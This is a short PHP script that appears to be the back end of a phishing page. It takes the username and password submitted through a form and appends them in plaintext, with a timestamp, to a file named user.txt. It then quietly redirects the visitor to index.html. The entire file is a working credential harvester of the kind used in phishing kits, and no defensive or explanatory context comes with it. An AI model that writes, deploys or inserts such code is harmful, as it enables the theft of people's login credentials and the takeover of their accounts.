<?php
$user = $_POST['user'] ?? '';
$pass = $_POST['pass'] ?? '';

$line = "User: $user | Password: $pass | Date: " . date("Y-m-d H:i:s") . "\n";

file_put_contents("user.txt", $line, FILE_APPEND);

header("Location: index.html");
exit;
?>
